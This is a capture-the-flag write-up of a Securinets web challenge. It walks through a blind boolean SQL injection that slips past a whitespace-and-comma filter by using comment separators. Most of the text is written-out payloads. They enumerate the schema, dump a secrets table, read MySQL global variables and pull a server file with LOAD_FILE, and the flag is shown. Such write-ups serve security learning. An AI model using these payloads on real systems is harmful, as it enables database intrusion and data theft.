# Web Challenge 2 the after prequal

I decided to also add the methodology I used to get to the solution. This may not be the most effective way and I built some scripts to handle part of the tasks here. I'm sure there was a way to configure sqlmap to accomplish this as well, but sqlmap was not used in this solution. I attempted to do this in a way that would help me get a better technical understanding of sqli attacks.


## Methodology (You can skip to the solution section if you just want the tl;dr version)

### Initial Probing
The challenge prompt directed us to a website. The first thing to catch my eye there was the search field that was available.
![alt text](images/web_page_header.png "SQLi vuln target")

After playing with it and typing in a single quote I got back a sql error. So sql injection challenge it is.

I noticed that adding a space would not return a sql error. Instead it seemed like the query wouldn't be evaluated. In this case a workaround was to add empty comments wherever a space would be. I also wanted to test if this worked and built this query to test with:
`')/**/OR/**/1=1/**/AND/**/SLEEP(1)/**/#`
This gave a slow response back. So this made me confident this would be the format to use.

I then tried to see if I could just get a union statement to work. My first attempt seemed to have some potential.
`')/**/UNION/**/SELECT/**/1/**/AND/**/SLEEP(1)/**/#`
This returned: `The used select statements have different number of columns`

So now the next step was to figure out the right number of columns. This seemed straight-forward so far...
`')/**/UNION/**/SELECT/**/1,2/**/AND/**/SLEEP(1)/**/#`
This one returned immediately (meaning my query was not evaluated), after trying some more I realized commas are being filtered. If the payload contains a comma then nothing happens.

**So lessons so far: statements with whitespaces and commas are being filtered.**

I then tried out some different queries. I tried this statement:
`')/**/union/**/select/**/*/**/FROM/**/notes;#`
which finally returned:
```
Table 'db.notes' doesn't exist
```
So at least now I know the database name: `db`


I tried modifying the db name to see what would happen.
`')/**/union/**/select/**/*/**/FROM/**/dba.test;#`
returned:
```
SELECT command denied to user 'baha'@'172.19.0.4' for table 'test'
```
Which may mean we have some permissions set on the role we are abusing to only read from certain databases or tables.


Tried this next to see if our user would get blocked from reading information_schema tables:
`')/**/union/**/select/**/*/**/FROM/**/information_schema.schemata;#`
returned:
```
The used SELECT statements have a different number of columns
```
Nice! So this helped reassure me of the assumptions I have made so far.

Ok so dumb idea time, look up different information schema tables and try the ones with different number of columns until I don't get that error anymore.

Trying a table with 4 columns
`')/**/union/**/select/**/*/**/FROM/**/information_schema.CHARACTER_SETS;#`
```
The used SELECT statements have a different number of columns
```

Trying table with 2 columns
`')/**/union/**/select/**/*/**/FROM/**/information_schema.COLLATION_CHARACTER_SET_APPLICABILITY;#`
```
The used SELECT statements have a different number of columns
```

Ok after spending a lot of time looking for information_schema tables with different number of columns I decided I could either spin up a mysql server and checkout the columns table to better get a read on this, or try a different approach.

So what do I know so far? There are certain blacklisted characters that prevent the query from being passed to the vulnerable sql. As of now I know that includes whitespace and commas. The database we can read from is called `db`.

I then started to play around with seeing if I could get different results to see if an inferential vulnerability was here. The cheat sheet I tend to take my base queries from is the [Perspective Risk one](https://www.perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/). 

I started to play with:

`')/**/AND/**/1=1;#`
and 
`')/**/AND/**/1=2;#`

but there was no changes. I then realized both would evaluate to the same thing (a blank page). So I tried using an ID that actually existed and observed how that changed.

`1')/**/AND/**/1=1;#`
returned the search result of ID 1
`1')/**/AND/**/1=2;#`
returned a blank page.

### Exfiltration (w/ python) - Table Value dumps
Now I got something I can work with. The queries from the sqli cheat sheet had to be modified so that they wouldn't be filtered. I used this one as a test one:
`1')/**/AND/**/(ascii(substr((SELECT/**/schema_name/**/FROM/**/information_schema.schemata/**/LIMIT/**/1/**/OFFSET/**/0)/**/FROM/**/1/**/FOR/**/1)))/**/>/**/95;#`
This is the fully constructed boolean inferential sqli I will use. To prove this works I'll try and get the database name 'db' which I already know exists. I wrote a script to do this which I will add in another directory. I'll also add some comments at the top of the scripts to explain how they work a bit. The last output line is usually the full string we wanted. The array above it will usually be the ascii decimal representation of that string. 

I already knew the databse name was 'db' from the error message I got earlier. And my script confirmed it:
```
$ python get_db_name.py 
Guessing 1
Guessing 2
Guessing 3
Length of database name is: 2
Guessing 95
Guessing 111
Guessing 103
Guessing 99
Guessing 101
Guessing 100
Guessing 100
Guessing 99
The ascii char is: d
Guessing 95
Guessing 111
Guessing 103
Guessing 99
Guessing 97
Guessing 98
Guessing 98
Guessing 97
The ascii char is: b
[100, 98]
db
```


Using that script I branched off, changing the sql injection strings to get table names.
The first two tables I found were:
brain
secrets
```
$ python get_table_names.py 
Guessing 1
...
Guessing 8
Length of table name is: 7
...
The ascii char is: s
...
The ascii char is: e
...
The ascii char is: c
...
The ascii char is: r
...
The ascii char is: e
...
The ascii char is: t
...
The ascii char is: s
[115, 101, 99, 114, 101, 116, 115]
secrets
```

Secrets seems like the juicy one so I then modified my sql injection strings to extract column names.
The columns found for the secrets table were: name and value
```
$ python get_column_names.py 
...
Number of columns 2
...
Length of column 0 name is: 4
...
The ascii char is: n
...
The ascii char is: a
...
The ascii char is: m
...
The ascii char is: e
[110, 97, 109, 101]
name
...
Length of column 1 name is: 5
...
The ascii char is: v
...
The ascii char is: a
...
The ascii char is: l
...
The ascii char is: u
...
The ascii char is: e
[118, 97, 108, 117, 101]
value
All columns found:
['name', 'value']
```

Finally it was time to modify my script to extract the values.
There was only one row in the secrets table.
The name in that row was flag.
The value in that row was: flag was moved to flag.txt
```
$ python get_values.py 
...
[102, 108, 97, 103, 32, 104, 97, 115, 32, 98, 101, 101, 110, 32, 109, 111, 118, 101, 100, 32, 116, 111, 32, 102, 108, 97, 103, 46, 116, 120, 116]
flag has been moved to flag.txt
```

I did some googling and found that mysql has a way to interact with files. So I tried the following query

`1')/**/UNION/**/SELECT/**/LOAD_FILE('flag.txt');#`
which returned
```
The used SELECT statements have a different number of columns
```
So maybe I can infer the values here too. I just guessed the path here assuming one of the default ones.

`1')/**/AND/**/(SELECT/**/LOAD_FILE("/var/lib/mysql/flag.txt"))/**/LIKE/**/"s%";#`

`1')/**/AND/**/(SELECT/**/LOAD_FILE("/var/lib/mysql/flag.txt"))/**/IS/**/NOT/**/NULL;#`
However both formats did not give anything useful back. The path for the file must be wrong. After talking about how the `load_file` function works and rereading the docs the next step must be to find the directory.

### Exfiltration - Getting directory on server

Since `load_file` requires a full path to the file, I know what the first char must be: `/`
First attempt:
`1')/**/AND/**/(SELECT/**/concat('$(pwd)'))/**/LIKE/**/'/%';#`
This did not work though, \*sigh\*

After spending a lot of time digging through docs and googling around I found the syntax I was looking for. My path for finding this was looking up what variables were in mysql, and after that finding different ways to access them.
The syntax I was looking for:
`SELECT @@GLOBAL.datadir`

Building out the query:
```
AND (SELECT @@GLOBAL.datadir) LIKE "/%"
AND/**/(SELECT/**/@@GLOBAL.datadir)/**/LIKE/**/"/%"
`1')/**/AND/**/(SELECT/**/@@GLOBAL.datadir)/**/LIKE/**/"/%";#`
```
This returned true!. So now I customized my script to extract the the data directory. I changed the format of the query a bit so I could reuse the logic I already had there.
After I got the data directory, I realized it might be a good idea to get the secure_file_priv variable as well to see if I could even read from the data directory. That gave an interesting result. The path `/var/lib/mysql-files/flag/` using this I checked for the file once again:
`1')/**/AND/**/(SELECT/**/LOAD_FILE("/var/lib/mysql-files/flag/flag.txt"))/**/IS/**/NOT/**/NULL;#`
and this time it evaluated to true!

### Exfiltration - Reading the txt file
Now to read from the file
I just used the same method that was used to extract the other values.
```
$ python get_flag_txt.py 
...
[83, 101, 99, 117, 114, 105, 110, 101, 116, 115, 123, 83, 101, 99, 117, 82, 51, 95, 89, 111, 117, 114, 83, 81, 76, 33, 125, 10]
Securinets{SecuR3_YourSQL!}
```


## Solution (tl;dr version)

The search field on the web page had a sql injection vulnerability.

Testing payloads on the input some blacklisted characters were found: whitespace and comma.

A boolean inferential injection was created. Using the results of a search to determine if it evaluated to true or not.
If true the search results would contain a thought.
If false the search results would be blank.

Example truth payload:
`1')/**/AND/**/1=1;#`
Example false payload:
`1')/**/AND/**/1=2;#`

Using the queries from the perspective risk sqli cheat sheet as a base, I modified them to avoid being filtered out (removing whitespace and rewriting the queries to not use commas).
I then made some python scripts:
```
get_db_name.py 		#Get a database name
get_table_names.py 	#Get a table name in a specified database
get_column_names.py #Get columns from a specified table.
get_values.py 		#Get values from a specifed column in a specified table.
```

This turned out to redirect the challenge since the flag was not in the database. There was a note in the entry in the secrets table saying the flag was moved to a txt file.

The next steps were to figure out where the file was and then read the contents of the file, still using sql. A full path to the file was needed. To accomplish this values were read from the sql global variables and the `load_file` function was used to get the file contents.

```
get_sql_variable.py #Get the value of a global variable.
get_flag_txt.py 	#Get the contents of the flag.txt file
```

Ultimately resulting in getting the flag.
```
$ python get_flag_txt.py 
...
[83, 101, 99, 117, 114, 105, 110, 101, 116, 115, 123, 83, 101, 99, 117, 82, 51, 95, 89, 111, 117, 114, 83, 81, 76, 33, 125, 10]
Securinets{SecuR3_YourSQL!}
```
